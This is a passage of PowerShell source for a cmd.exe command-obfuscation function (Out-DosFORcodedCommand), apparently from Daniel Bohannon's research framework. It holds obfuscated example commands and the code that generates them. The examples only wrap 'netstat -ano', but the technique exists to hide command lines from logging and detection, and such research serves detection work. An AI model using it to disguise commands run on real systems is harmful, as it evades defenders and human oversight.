FOR /F "delims=qA=f7 tokens=2" %B IN ('assoc^|find "md="')DO %B,         ,     ,      ,       ,   ,    /V:oN           ,       ,        ,       ,       /c          "       ,   ,       ,    ,    (      ,           (             ,             (           ,       ,      ,              (               ,       ,          ,          ,     ,          (sET         +   =g^)y/jEe""I3SX tbN.1rciClh:oODdWn\a^(wLp-)         ,              ,     ,      ,       ,               )              ,           ,          ,               ,             ,         ,        ,      )      ,             ,       ,       )           ,      ,           ,            ,          ,            )&&              ,      ,     ,     ,   ,      ,       ,        FOR      ,    ,        ,      %m      ,    ,   ,        ,     ,      ,      IN        ,   ,       ,      ,   ,       ,        (                                             +9                                                          +5             +12                                                              +13                                                            +34                                                                                              16                                                             +6                                                                                                      35                                                                                 +38                                                         +27      +15        +4           6                                                                            20                                                                       +14                                                                                    13         16              +6           +14             +17                                                                    +30        6                                                     15                                                                         22                                                          +23                                                                                            +21                                                                                                       +6                                                                             31                                                                                          +14                                                          +1                                         +17                                                                              +28                                                     +26                                                   +35     31            23       26                                                                  +33                                                             29            +11                                                          14                                                     19     +21                                                            +31        0              34                                                 +32                                                                                                      +8                                                                            +24           +14     14                                                                      +37                                                                 25           +3                                                                            +3           +15                                      +21                                                                            14      17                                      23                                                      +2        +3                                                                +36              +10                                                                                   -0      18                                                               +14            +32                                                                  +8     +1                                                                        49)      ,    ,      ,       ,     ,     ,   DO (      ,     ,               ,          ,        ,     (      ,          ,     ,       ,         ,        (Set        `   =!`   !!+   :~           %m,               1!)        ,             ,         ,     ,           ,       ,          ,          )        ,        ,            ,        ,         ,         )&&        ,   ,       ,     ,       ,        ,     iF      ,      ,    ,   %m    ,      ,    ,      ,   ,    geq    ,   ,   ,     +49        ,   ,    ,    ,       poWeRshEll       ;   ;       ;      "       ;   ;    ;   ;    (                                                        (                                                                                                (                                                                  (                                          (!`   :~      +6!)  )    ) ) )"   ;   ;       ;     ;       ;       ;    ;    "

.EXAMPLE

C:\PS> Out-DosFORcodedCommand -Command 'netstat -ano' -DecoySetCommandString 'Totally not meant for trolls or lulz ;)'

cmd /V/C"set 8dFn=Totally not meant for trolls or lulz ;)-&&for %S in (15,13,22,27,22,14,22,36,39,14,15,29,50)do set 3GJ=!3GJ!!8dFn:~%S,1!&&if %S==50 call %3GJ:~5%"

.EXAMPLE

C:\PS> Out-DosFORcodedCommand -Command 'netstat -ano' -DecoySetCommandChars @('_','-','/','\','~','(',')','[',']','{','}')

FOR /F "tokens=2 delims==fWY" %A IN ('assoc^|findstr md^=')DO %A /V:/C"set 7E=t-o[\e {~}as/n_()]&&for %f in (13,5,0,11,0,10,0,6,1,10,13,2,28)do set 3sJ=!3sJ!!7E:~%f,1!&&if %f geq 28 call %3sJ:~5%"

.NOTES

This is a personal project developed by Daniel Bohannon while an employee at MANDIANT, A FireEye Company.

.LINK

http://www.danielbohannon.com
#>

    [CmdletBinding()]
    param (
        [Parameter(Position = 0, Mandatory = $true, ValueFromPipeline = $true)]
        [System.String]
        $Command,
        
        [Parameter(Position = 0, Mandatory = $false)]
        [ValidateSet('cmd','powershell','none')]
        [System.String]
        $FinalBinary = 'none',
        
        [Parameter(Position = 0, Mandatory = $false)]
        [ValidateSet(1,2,3)]
        [System.Int16]
        $ObfuscationLevel,
        
        [Parameter(Position = 0, Mandatory = $false)]
        [System.String]
        $CmdSyntax = (Get-Random -InputObject @('cmd','cmd.exe',(Get-ObfuscatedCmd -ObfuscationType env),(Get-ObfuscatedCmd))),
        
        [Parameter(Position = 0, Mandatory = $false)]
        [System.String]
        $Cmd2Syntax = (Get-Random -InputObject @('cmd','cmd.exe',(Get-ObfuscatedCmd -ObfuscationType env),(Get-ObfuscatedCmd))),
        
        [Parameter(Position = 0, Mandatory = $false)]
        [System.String]
        $PowerShellSyntax = (Get-Random -InputObject @('powershell','powershell.exe',(Get-ObfuscatedPowerShell -ObfuscationType env),(Get-ObfuscatedPowerShell))),
        
        [Parameter(Position = 0, Mandatory = $false)]
        [Switch]
        $StdIn,
        
        [Parameter(Position = 0, Mandatory = $false)]
        [ValidateScript( { ($_.Trim() -notmatch '([&|<>]|^\"[^"]|[^"]\"$|[^"]\"[^"]|\/[abcdefkqrstuv\?])') } )]
        [System.String]
        $DecoyString1,
        
        [Parameter(Position = 0, Mandatory = $false)]
        [ValidateScript( { ($_.Trim() -notmatch '([&|<>]|^\"[^"]|[^"]\"$|[^"]\"[^"]|\/[abcdefkqrstuv\?])') } )]
        [System.String]
        $DecoyString2,
        
        [Parameter(Position = 0, Mandatory = $false)]
        [ValidateScript( { ($_.Trim() -notmatch '(^[^v\^] |[&|<>]|^\"[^"]|[^"]\"$|[^"]\"[^"]|[^^]\/[abcdefkqrstuv\?])') -and -not ($_.Trim().ToLower().StartsWith('v:of')) } )]
        [System.String]
        $VFlag = (Get-Random -InputObject @('V','V:','V:O','V:ON')),
        
        [Parameter(Position = 0, Mandatory = $false)]
        [System.String]
        $DecoySetCommandString,
        
        [Parameter(Position = 0, Mandatory = $false)]
        [ValidateNotNullOrEmpty()]
        [ValidateScript( { -not ($_ | where-object { ($_.ToString().Length -ne 1) }) } )]
        [System.Object[]]
        $DecoySetCommandChars,
        
        [Parameter(Position = 0, Mandatory = $false)]
        [Switch]
        $RandomCase,
        
        [Parameter(Position = 0, Mandatory = $false)]
        [Switch]
        $RandomSpace,
        
        [Parameter(Position = 0, Mandatory = $false)]
        [ValidateScript( { ($_ | sort-object | select-object -First 1) -ge 0 } )]
        [System.Object[]]
        $RandomSpaceRange = @(0..4),
        
        [Parameter(Position = 0, Mandatory = $false)]
        [Switch]
        $RandomFlag,
        
        [Parameter(Position = 0, Mandatory = $false)]
        [Switch]
        $RandomCaret,
        
        [Parameter(Position = 0, Mandatory = $false)]
        [ValidateScript( { ($_ -ge 0) -and ($_ -le 100) } )]
        [System.Int16]
        $RandomCaretPercent = 50,
        
        [Parameter(Position = 0, Mandatory = $false)]
        [Switch]
        $RandomChar,
        
        [Parameter(Position = 0, Mandatory = $false)]
        [ValidateScript( { ($_ | sort-object | select-object -First 1) -ge 0 } )]
        [System.Object[]]
        $RandomCharRange = @(1..5),
        
        [Parameter(Position = 0, Mandatory = $false)]
        [ValidateScript( { ($_ -ge 0) -and ($_ -le 100) } )]
        [System.Int16]
        $RandomCharPercent = 50,
        
        [Parameter(Position = 0, Mandatory = $false)]
        [ValidateScript( { ($_ | where-object { @(',',';') -contains $_ }) -or ($_ | where-object { ($_.Count -eq 2) -and (@(',',';') -contains $_[0]) -and (@(',',';') -contains $_[1]) }) } )]
        [System.Object[]]
        $RandomCharArray = (Get-Random -InputObject @(@(','),@(';'),@(',',';'))),
        
        [Parameter(Position = 0, Mandatory = $false)]
        [Switch]
        $VarNameSpecialChar,
        
        [Parameter(Position = 0, Mandatory = $false)]
        [Switch]
        $VarNameWhitespace
    )

    # Create "profiles" depending on -ObfuscationLevel value and the length of the input -Command value. This is to simplify general usage of this function without becoming overwhelmed by all of the options.
    if ($ObfuscationLevel)
    {
        switch ($ObfuscationLevel)
        {
            '1' {
                $StdIn              = $false
                $VFlag              = 'V:ON'
                $RandomCase         = $false
                $RandomSpace        = $false
                $RandomCaret        = $false
                $RandomChar         = $false
                $VarNameSpecialChar = $false
                $VarNameWhitespace  = $false

                $CmdSyntax          = Get-Random -InputObject @('cmd','cmd.exe')
                $Cmd2Syntax         = Get-Random -InputObject @('cmd','cmd.exe')
                $PowerShellSyntax   = Get-Random -InputObject @('powershell','powershell.exe')
            }
            '2' {
                $StdIn              = Get-Random -InputObject @($true,$false)
                $RandomCase         = $true
                $RandomSpace        = $true
                $RandomSpaceRange   = @(0..3)
                $RandomFlag         = $true
                $RandomCaret        = $true
                $RandomCaretPercent = Get-Random -InputObject @(35..50)
                $RandomChar         = $true
                $RandomCharRange    = @(1..2)
                $RandomCharPercent  = Get-Random -InputObject @(35..50)
                $RandomCharArray    = Get-Random -InputObject @(@(','),@(';'))
                $VarNameSpecialChar = $false
                $VarNameWhitespace  = $false

                $CmdSyntax          = Get-ObfuscatedCmd        -ObfuscationType env -RandomCase:$RandomCase -RandomSpace:$RandomSpace -RandomSpaceRange:$RandomSpaceRange -RandomChar:$RandomChar -RandomCharRange:$RandomCharRange -RandomCharArray:$RandomCharArray -RandomCaret:$RandomCaret -RandomCaretPercent:$RandomCaretPercent
                $Cmd2Syntax         = Get-ObfuscatedCmd        -ObfuscationType env -RandomCase:$RandomCase -RandomSpace:$RandomSpace -RandomSpaceRange:$RandomSpaceRange -RandomChar:$RandomChar -RandomCharRange:$RandomCharRange -RandomCharArray:$RandomCharArray -RandomCaret:$RandomCaret -RandomCaretPercent:$RandomCaretPercent
                $PowerShellSyntax   = Get-ObfuscatedPowerShell -ObfuscationType env -RandomCase:$RandomCase -RandomSpace:$RandomSpace -RandomSpaceRange:$RandomSpaceRange -RandomChar:$RandomChar -RandomCharRange:$RandomCharRange -RandomCharArray:$RandomCharArray -RandomCaret:$RandomCaret -RandomCaretPercent:$RandomCaretPercent
            }
            '3' {
                # Randomly generate values for decoy strings and /V flag if not explicitly set (or if set to default values).
                if (-not $DecoyString1)
                {
                    $DecoyString1 = -join (Get-Random -InputObject ([System.Char[]] (@(48..57) + @(65..90) + @(97..122))) -Count (Get-Random -InputObject @(1..10)))
                }
                if (-not $DecoyString2)
                {
                    $DecoyString2 = -join (Get-Random -InputObject ([System.Char[]] (@(48..57) + @(65..90) + @(97..122))) -Count (Get-Random -InputObject @(1..10)))
                }
                if (@('V','V:','V:O','V:ON') -contains $Vflag)
                {
                    do
                    {
                        $vFlagTemp = 'V' + -join (Get-Random -InputObject ([System.Char[]] (@(48..57) + @(65..90) + @(97..122)) + @('~','!','@','#','$','*','(',')','-','_','+','=','{','}','[',']',':',';','?')) -Count (Get-Random -InputObject @(1..10)))
                    }
                    while (($vFlagTemp.Trim() -match '(^[^v\^] |[&|<>]|^\"[^"]|[^"]\"$|[^"]\"[^"]|[^^]\/[abcdefkqrstuv\?])') -or ($vFlagTemp.Trim().ToLower().StartsWith('v:of')))
                    $VFlag = $vFlagTemp
                }

                $StdIn              = $true
                $RandomCase         = $true
                $RandomSpace        = $true
                $RandomSpaceRange   = @(2..4)
                $RandomFlag         = $true
                $RandomCaret        = $true
                $RandomCaretPercent = Get-Random -InputObject @(75..90)
                $RandomChar         = $true
                $RandomCharRange    = @(2..3)
                $RandomCharPercent  = Get-Random -InputObject @(75..90)
                $RandomCharArray    = @(',',';')
                if (Get-Random -InputObject @(0..1))
                {
                    $VarNameSpecialChar = $false
                    $VarNameWhitespace  = $true
                }
                else
                {            
                    $VarNameSpecialChar = $true
                    $VarNameWhitespace  = $false
                }

                # Override certain values for unusually large commands to try to remain under the 8,190 character limit of cmd.exe.
                if (($Command.Length -gt 150) -and ($Command.Length -le 500))
                {
                    $RandomSpaceRange   = @(1..3)
                    $RandomCharRange    = @(1..2)
                    $RandomCharPercent  = Get-Random -InputObject @(15..30)
                    $RandomCaretPercent = Get-Random -InputObject @(15..30)
                }
                elseif ($Command.Length -gt 500)
                {
                    $RandomSpaceRange   = @(0..2)
                    $RandomCharRange    = @(1..2)
                    $RandomCharPercent  = Get-Random -InputObject @(10..15)
                    $RandomCaretPercent = Get-Random -InputObject @(10..15)
                }

                $CmdSyntax        = Get-ObfuscatedCmd        -ObfuscationType (Get-Random -InputObject @('assoc','ftype')) -DoubleEscape -RandomCase:$RandomCase -RandomSpace:$RandomSpace -RandomSpaceRange:$RandomSpaceRange -RandomChar:$RandomChar -RandomCharRange:$RandomCharRange -RandomCharArray:$RandomCharArray -RandomCaret:$RandomCaret -RandomCaretPercent:$RandomCaretPercent
                $Cmd2Syntax       = Get-ObfuscatedCmd        -ObfuscationType (Get-Random -InputObject @('assoc','ftype')) -DoubleEscape -RandomCase:$RandomCase -RandomSpace:$RandomSpace -RandomSpaceRange:$RandomSpaceRange -RandomChar:$RandomChar -RandomCharRange:$RandomCharRange -RandomCharArray:$RandomCharArray -RandomCaret:$RandomCaret -RandomCaretPercent:$RandomCaretPercent
                $PowerShellSyntax = Get-ObfuscatedPowerShell -ObfuscationType (Get-Random -InputObject @('assoc','ftype')) -DoubleEscape -RandomCase:$RandomCase -RandomSpace:$RandomSpace -RandomSpaceRange:$RandomSpaceRange -RandomChar:$RandomChar -RandomCharRange:$RandomCharRange -RandomCharArray:$RandomCharArray -RandomCaret:$RandomCaret -RandomCaretPercent:$RandomCaretPercent
            }
        }
    }

    # Set regex values to identify and replace the two single-alphanumeric character variables for the FOR loop at the end of this function if intricate syntax for $Cmd2Syntax or $PowerShellSyntax are used.
    $intricateForLoopRegex1 = '[\s\^\(,;]\%\^{0,1}[a-z0-9][\s\^\(,;]+I\^{0,1}N[\s\^,;]'
    $intricateForLoopRegex2 = 'D\^{0,1}O[\s\^\(,;]+\%\^{0,1}[a-z0-9]'

    # Check for intricate syntax (FOR LOOP) in input binary syntaxes.
    $intricateSyntaxRegex      = "$intricateForLoopRegex1.*$intricateForLoopRegex2"
    $intricateCmdSyntax        = $false
    $intricateCmd2Syntax       = $false
    $intricatePowerShellSyntax = $false
    if ($CmdSyntax -match $intricateSyntaxRegex)
    {
        $intricateCmdSyntax = $true
    }
    if ($Cmd2Syntax -match $intricateSyntaxRegex)
    {
        $intricateCmd2Syntax = $true
    }
    if ($PowerShellSyntax -match $intricateSyntaxRegex)
    {
        $intricatePowerShellSyntax = $true
    }
    
    # If using one of the more intricate PowerShell syntaxes that contain additional execution logic to retrieve the binary name then ensure that PowerShell commands are set to StdIn.
    if (($FinalBinary -eq 'powershell') -and (-not $StdIn.IsPresent) -and $intricatePowerShellSyntax)
    {
        $StdIn = $true
    }

    # Check user-input $Command for uneven double quotes.
    if (Test-ContainsUnevenDoubleQuote -Command $Command)
    {
        return $null
    }

    # Remove any invalid tab characters from user-input $Command.
    if (-not ($Command = Remove-Tab -Command $Command))
    {
        return $null
    }
    
    # If user-input $Command contains characters that need escaping and no -FinalBinary has been selected then override to -FinalBinary 'cmd'.
    if (($FinalBinary -eq 'none') -and (Test-ContainsEscapableCharacter -Command $Command))
    {
        $FinalBinary = 'cmd'
    }

    # If cmd.exe-style environment variables are found in the user-input $Command then ensure that -StdIn is selected and -FinalBinary is not 'none'.
    # Try to rule out multiple instances of '%' in the command being used in the context of PowerShell (as an alias of the foreach-object cmdlet) and not and cmd.exe environment variable (e.g. PowerShell.exe <PS command> | % { <for each object do ___> })
    if (($Command -match '\%.*\%') -and ($Command -notmatch '( |\|)\%\s*{'))
    {
        # Set $StdIn to $true if it currently is not.
        if (-not $StdIn.IsPresent)
        {
            $StdIn = $true
        }

        # Set $FinalBinary to 'cmd' if it is not defined.
        if ($FinalBinary -eq 'none')
        {
            $FinalBinary = 'cmd'    
        }
    }

    # If -FinalBinary is 'cmd' and -StdIn is selected and user-input $Command contains an escapable character within a string then change -StdIn to $false due to escaping complexities.
    if (($FinalBinary -eq 'cmd') -and $StdIn.IsPresent -and (Test-ContainsEscapableCharacterInString -Command $Command))
    {
        $stdIn = $false
    }

    # Perform an additional layer of escaping specifically for PowerShell commands containing escapable characters within various string tokens.
    if ($FinalBinary -eq 'powershell')
    {
        $Command = Out-EscapedPowerShell -CommandToEscape $Command -StdIn:$StdIn
    }

    # Since the non-StdIn PowerShell command will be encapsulated by double quotes, we must escape any existing double quotes for the powershell.exe context with backslashes.
    if (-not $StdIn.IsPresent -and ($FinalBinary -eq 'powershell') -and $Command.Contains('"'))
    {
        $Command = $Command -replace '\\\"','\\"' -replace '\"','\"'
    }

    # Maintain array to ensure all randomly-generated variable names are unique per function invocation (and that single-character FOR loop variables do and unique leading characters maintained for any potential FOR loops in the command) to prevent variable name collisions.
    $script:varNameArray = @()

    # Maintain array to ensure all single-character FOR loop variable names do not collide with any additional randomly-generated variable names.
    $script:reservedUniqueFirstChars = @()

    # Retrieve characters to use in setting the command characters as an initial process-level environment variable.
    # The default is randomly-ordered unique characters from -Command, but can introduce custom string or character array with -DecoySetCommandString and -DecoySetCommandChars, respectively.
    if ($DecoySetCommandString)
    {
        # Set user-input $DecoySetCommandString string as the default value for $envVarSetCommandChars.
        $envVarSetCommandChars = $DecoySetCommandString

        # Find any and all characters found in $Command that are not represented in $DecoySetCommandString.
        $missingCharacters = Compare-Object ([System.Char[]] $Command | sort-object -Unique) ([System.Char[]] $DecoySetCommandString | sort-object -Unique) | where-object { $_.SideIndicator -eq '<=' } | foreach-object { $_.InputObject }
        
        # If any characters found in $Command were not found in $DecoySetCommandString then add them to the end of $envVarSetCommandChars and throw a warning.
        if ($missingCharacters)
        {
            if ($missingCharacters.Count -eq 1)
            {
                $charStrMsg = 'character was'
                $itIsStrMsg = 'it is'
            }
            else
            {
                $charStrMsg = [System.String] $missingCharacters.Count + ' characters were'
                $itIsStrMsg = 'they are'
            }
            
            # Throw warning only if -Verbose flag is selected.
            if ($Verbose.IsPresent)
            {
                Write-Warning "The following $charStrMsg found in -Command but not in -DecoySetCommandString, so $itIsStrMsg being added to the end of `$DecoySetCommandString: $(-join $missingCharacters)"
            }

            # Add $missingCharacters (in random order) to the end of $envVarSetCommandChars so -Command can be properly reassembled in final result.
            $envVarSetCommandChars += -join (Get-Random -InputObject $missingCharacters -Count $missingCharacters.Count)
        }
    }
    elseif ($DecoySetCommandChars)
    {
        # Find any and all characters found in $Command that are not represented in $DecoySetCommandChars.
        $missingCharacters = Compare-Object ([System.Char[]] $Command | sort-object -Unique) ($DecoySetCommandChars | sort-object -Unique) | where-object { $_.SideIndicator -eq '<=' } | foreach-object { $_.InputObject }
        
        # If any characters found in $Command were not found in $DecoySetCommandChars then add them to $DecoySetCommandChars and throw a warning.
        if ($missingCharacters)
        {
            if ($missingCharacters.Count -eq 1)
            {
                $charStrMsg = 'character was'
                $itIsStrMsg = 'it is'
            }
            else
            {
                $charStrMsg = [System.String] $missingCharacters.Count + ' characters were'
                $itIsStrMsg = 'they are'
            }
            
            # Throw warning only if -Verbose flag is selected.
            if ($Verbose.IsPresent)
            {
                Write-Warning "The following $charStrMsg found in -Command but not in -DecoySetCommandChars, so $itIsStrMsg being added to `$DecoySetCommandChars: $(-join $missingCharacters)"
            }

            # Add $missingCharacters (in random order) to $DecoySetCommandChars so -Command can be properly reassembled in final result.
            $DecoySetCommandChars += (Get-Random -InputObject $missingCharacters -Count $missingCharacters.Count)
        }

        # Select randomized order of all characters from $DecoySetCommandChars for $envVarSetCommandChars so -Command can be properly reassembled in final result.
        $envVarSetCommandChars = -join (Get-Random -InputObject $DecoySetCommandChars -Count $DecoySetCommandChars.Count)

    }
    else
    {
        # Retrieve all unique characters from user-input $Command. These will be randomized and set in a process-level environment variable to be later referenced by index in the final result's FOR loop.
        $envVarSetCommandChars = [System.Char[]] $Command | sort-object -Unique
    }

    # Add cmd.exe's escape character of '^' to $envVarSetCommandChars if $Command contains any escapable characters and does not already contain '^'.
    if ((Test-ContainsEscapableCharacter -Command $Command) -and ($StdIn.IsPresent) -and ($envVarSetCommandChars -notcontains '^'))
    {
        $envVarSetCommandChars += '^'
    }

    # Join characters back into a single string (in a randomized order) to be set as a process-level environment variable in the final result.
    $envVarSetCommandCharsAsString = -join (Get-Random -InputObject $envVarSetCommandChars -Count $envVarSetCommandChars.Count)

    # Add "escaped" double quote if necesary so that indexing will be handled properly in the following steps.
    # This is necessary since "" will count as two characters when indexing on the command line, whereas cmd.exe's escape character (e.g. ^| , ^& , etc.) does not count as any length in memory.
    if ($envVarSetCommandCharsAsString.Contains('"'))
    {
        $envVarSetCommandCharsAsString = $envVarSetCommandCharsAsString.Replace('"','""')
    }

    # Define special characters that deserve extra escaping attention from a cmd.exe perspective.
    $charsToEscape = @('^','&','|','<','>')

    # Translate $Command into corresponding indexes of the characters in $envVarSetCommandCharsAsString.
    # If character is a special character in $charsToEscape then also include the previous index to capture the escape in the reassembled command.
    # Lastly, since we will be expanding the command in memory via cmd.exe's V/:ON option then when dealing with PowerShell commands not in the context of StdIn then we will avoid double-escaping by removing previously-add escapes from the earlier Out-EscapedPowerShell function call.
    if (-not $StdIn.IsPresent -and ($FinalBinary -eq 'powershell'))
    {
        $Command = ($Command -Split '\^{2}' | foreach-object { if ($_.Length -eq 0) {''} else {$_.Replace('^','')} }) -join '^'
    }

    # Iterate through each character in the user-input $Command and output index for each character along with index of ^ for appropriate cmd.exe-level escaping when necessary.
    $commandIndexArray = [System.Char[]] $Command | foreach-object {
        $curChar = $_

        if ($charsToEscape -contains $curChar)
        {
            # Find and return the index of cmd.exe's ^ escape character if we are dealing with non-PowerShell StdIn payloads.
            if ($StdIn.IsPresent-and ($FinalBinary -ne 'powershell'))
            {
                $escapeCharIndex = $envVarSetCommandCharsAsString.IndexOf('^')
                $escapeCharIndex
            }
        }
            
        # Find and return the index of the current character.
        $charIndex = $envVarSetCommandCharsAsString.LastIndexOf($curChar)
        $charIndex
    }

    # Randomly select an integer to delineate the end of the above $commandIndexes values.
    $commandIndexBookend = Get-Random -InputObject @($envVarSetCommandCharsAsString.Length..($envVarSetCommandCharsAsString.Length + 10))

    # Add above bookend value to $commandIndexArray.
    $commandIndexArray += $commandIndexBookend

    # Return index array as a single string with optional whitespace and comma obfuscation if corresponding options are selected.
    $commandIndexes = Out-ObfuscatedArray -CommandIndexArray $commandIndexArray -RandomSpace:$RandomSpace -RandomSpaceRange:$RandomSpaceRange -RandomChar:$RandomChar -RandomCharRange:$RandomCharRange -RandomCharPercent:$RandomCharPercent -RandomCharArray:$RandomCharArray

    # If Out-ObfuscatedArray introduced a '+' character before the final index of the $commandIndexes array then reflect this syntax in $commandIndexBookend.
    if ($commandIndexes.Trim(' ,;^').EndsWith("+$commandIndexBookend"))
    {
        $commandIndexBookend = "+$commandIndexBookend"
    }

    # Add random carets if -RandomCaret switch is set.
    if ($RandomCaret.IsPresent)
    {
        $commandIndexes = Out-ObfuscatedCaret -StringToObfuscate $commandIndexes -RandomCaretPercent:$RandomCaretPercent
    }

    # Perform necessary cmd.exe-level escaping of certain special characters.
    # The final command will require two layers of escaping, but in memory only one will be present.
    # We will now add the second layer of escaping since we have already generated the proper indexes for the payload for how it will appear in memory.
    # We will also track the length of the final command given this last layer of escaping which will be used by cmd.exe's substring functionality in the final process-level environment variable in the final command.
    $commandLength = $Command.Length
    foreach ($char in $charsToEscape)
    {
        # Add cmd.exe-level escaping (^) for all special characters, and increase the length of the total command if the payload is PowerShell and -StdIn is selected.
        if ($envVarSetCommandCharsAsString.Contains($char))
        {
            # Perform escaping.
            $envVarSetCommandCharsAsString = $envVarSetCommandCharsAsString.Replace($char,"^$char")

            if ($StdIn.IsPresent -and ($FinalBinary -ne 'powershell'))
            {
                # Track increased command length with escape characters that were added above. This is important for proper substringing for the final reassembled command.
                $commandLength = $commandLength + (($Command -split "\$char").Count - 1)
            }
        }
    }

    # Generate random variable name and create a SET command for $envVarSetCommandCharsAsString created above from user-input $Command.
    $setVarResults = Out-SetVarCommand -SubstringArray $envVarSetCommandCharsAsString -RandomCase:$RandomCase -RandomSpace:$RandomSpace -RandomSpaceRange:$RandomSpaceRange -RandomCaret:$RandomCaret -RandomCaretPercent:$RandomCaretPercent -RandomChar:$RandomChar -RandomCharRange:$RandomCharRange -RandomCharPercent:$RandomCharPercent -RandomCharArray:$RandomCharArray -VarNameSpecialChar:$VarNameSpecialChar -VarNameWhitespace:$VarNameWhitespace

    # Extract SET command syntax array and random variable name array.
    $setCommandArray    = $setVarResults[0]
    $setCommandVarArray = $setVarResults[1]

    # Generate unique, random variable name and set in two separate variables so we can add an optional replacement syntax to second usage of var name in special case with paired double quotes.
    $commandVarNameSet = Get-RandomVarName -VarNameSpecialChar:$VarNameSpecialChar -VarNameWhitespace:$VarNameWhitespace
    $commandVarNameGet = $commandVarNameSet

    # Generate unique, random variable name to store the command as it is built character by character in each iteration of the FOR loop.
    $forLoopCommandVarName = Get-RandomVarName -VarNameSpecialChar:$VarNameSpecialChar -VarNameWhitespace:$VarNameWhitespace
    
    # Generate unique, random variable name to store the FOR loop index placeholder variable.
    # Do not allow this variable name to be a substring of another existing variable as this will cause errors.
    # E.g. %4U% and %4% both being variables where %4% is the variable name for $forLoopIndexVarName will not decode correctly.
    # The -UniqueFirstChar switch for Get-RandomVarName will handle this logic.
    $forLoopIndexVarName = Get-RandomVarName -UniqueFirstChar

    # Add random space to tilda options below (but not the asterisk syntax).
    $randomSpaceA = ''
    if ($RandomSpace.IsPresent)
    {
        $randomSpaceA = ' ' * (Get-Random -InputObject $RandomSpaceRange)
    }

    # Randomly select positive or negative index value or asterisk syntax that will strip out the $forLoopCommandVarName variable name from its value for the final result.
    # Randomly add explicit '+' sign to positive index value option if -RandomChar is selected.
    $randomPlusSign = ''
    if ($RandomChar.IsPresent -and ((Get-Random -InputObject @(1..100)) -le $RandomCharPercent))
    {
        $randomPlusSign = '+'
    }
    $finalSubstringIndex  = @()
    $finalSubstringIndex += '~' + $randomSpaceA + $randomPlusSign + ($forLoopCommandVarName.Length + 2)
    $finalSubstringIndex += '~' + $randomSpaceA + ($commandLength * -1)
    $finalSubstringIndex += '*' + $forLoopCommandVarName + '!='

    # Randomly select option from above.
    $finalSubstringIndex = Get-Random -InputObject $finalSubstringIndex

    # Set random whitespace values if -RandomSpace switch is set.
    $randomSpace1 = ''
    if ($RandomSpace.IsPresent)
    {
        $RandomSpace1 = ' ' * (Get-Random -InputObject $RandomSpaceRange)
    }
    
    # Set necessary component values.
    $call   = 'call'
    $set    = 'set'
    $echo   = 'echo'
    $for    = 'for'
    $in     = 'in'
    $do     = 'do'
    $if     = 'if'
    $equ    = 'equ'
    $geq    = 'geq'
    $gtr    = 'gtr'
    $andAnd = '&&'
    $c1     = 'C'
    $c2     = 'C'
    $VFlag  = '/' + $VFlag.TrimStart('/') + $randomSpace1

    # Set random flag values if -RandomFlag switch is set.
    if ($RandomFlag.IsPresent)
    {
        # Randomly choose between /C and /R flags since these flags are interchangeable for compatibility reasons (per "cmd.exe /?").
        $c1 = (Get-Random -InputObject @($c1,'R'))
        $c2 = (Get-Random -InputObject @($c2,'R'))
    
        # 1:4 decide if using environment variable syntax for first character of flag value.
        if ((Get-Random -InputObject @(0..3)) -eq 0)
        {
            $c1 = (Out-EnvVarEncodedCommand -StringToEncode $c1.Substring(0,1) -EnvVarPercent 100 -RandomCase:$RandomCase -RandomSpace:$RandomSpace -RandomSpaceRange:$RandomSpaceRange -RandomCaret:$RandomCaret -RandomCaretPercent:$RandomCaretPercent) + $c1.Substring(1)
        }
        if ((Get-Random -InputObject @(0..3)) -eq 0)
        {
            $c2 = (Out-EnvVarEncodedCommand -StringToEncode $c2.Substring(0,1) -EnvVarPercent 100 -RandomCase:$RandomCase -RandomSpace:$RandomSpace -RandomSpaceRange:$RandomSpaceRange -RandomCaret:$RandomCaret -RandomCaretPercent:$RandomCaretPercent) + $c2.Substring(1)
        }
        if ((Get-Random -InputObject @(0..3)) -eq 0)
        {
            $VFlag = (Out-EnvVarEncodedCommand -StringToEncode $VFlag.Substring(0,1) -EnvVarPercent (Get-Random -InputObject @(50..100)) -RandomCase:$RandomCase -RandomSpace:$RandomSpace -RandomSpaceRange:$RandomSpaceRange -RandomCaret:$RandomCaret -RandomCaretPercent:$RandomCaretPercent) + $VFlag.Substring(1)
        }
    }

    # Set random case values if -RandomCase switch is set.
    if ($RandomCase.IsPresent)
    {
        $call   = Out-RandomCase $call
        $set    = Out-RandomCase $set
        $echo   = Out-RandomCase $echo
        $c1     = Out-RandomCase (Get-Random -InputObject @($c1,'R'))
        $c2     = Out-RandomCase (Get-Random -InputObject @($c2,'R'))
        $for    = Out-RandomCase $for
        $in     = Out-RandomCase $in
        $do     = Out-RandomCase $do
        $if     = Out-RandomCase $if
        $equ    = Out-RandomCase $equ
        $geq    = Out-RandomCase $geq
        $gtr    = Out-RandomCase $gtr
        $VFlag  = Out-RandomCase $VFlag
        $andAnd = Get-Random -InputObject @('&','&&')

        # Only randomize the case of $CmdSyntax, $Cmd2Syntax and $PowerShellSyntax if they do not have escapable characters (as some of the more intricate syntaxes containing escapable characters are case-sensitive).
        if (-not $intricateCmdSyntax)
        {
            $CmdSyntax = Out-RandomCase $CmdSyntax
        }
        if (-not $intricateCmd2Syntax)
        {
            $Cmd2Syntax = Out-RandomCase $Cmd2Syntax
        }
        if (-not $intricatePowerShellSyntax)
        {
            $PowerShellSyntax = Out-RandomCase $PowerShellSyntax
        }
    }

    # Add random carets if -RandomCaret switch is set.
    if ($RandomCaret.IsPresent)
    {
        $call  = Out-ObfuscatedCaret -StringToObfuscate $call  -RandomCaretPercent:$RandomCaretPercent
        $set   = Out-ObfuscatedCaret -StringToObfuscate $set   -RandomCaretPercent:$RandomCaretPercent
        $echo  = Out-ObfuscatedCaret -StringToObfuscate $echo  -RandomCaretPercent:$RandomCaretPercent
        $for   = Out-ObfuscatedCaret -StringToObfuscate $for   -RandomCaretPercent:$RandomCaretPercent
        $in    = Out-ObfuscatedCaret -StringToObfuscate $in    -RandomCaretPercent:$RandomCaretPercent
        $do    = Out-ObfuscatedCaret -StringToObfuscate $do    -RandomCaretPercent:$RandomCaretPercent
        $if    = Out-ObfuscatedCaret -StringToObfuscate $if    -RandomCaretPercent:$RandomCaretPercent
        $equ   = Out-ObfuscatedCaret -StringToObfuscate $equ   -RandomCaretPercent:$RandomCaretPercent
        $geq   = Out-ObfuscatedCaret -StringToObfuscate $geq   -RandomCaretPercent:$RandomCaretPercent
        $gtr   = Out-ObfuscatedCaret -StringToObfuscate $gtr   -RandomCaretPercent:$RandomCaretPercent
        if ($c1 -notmatch '\%.*\:.*\%')
        {
            $c1 = Out-ObfuscatedCaret -StringToObfuscate $c1 -RandomCaretPercent:$RandomCaretPercent
        }
        if ($c2 -notmatch '\%.*\:.*\%')
        {
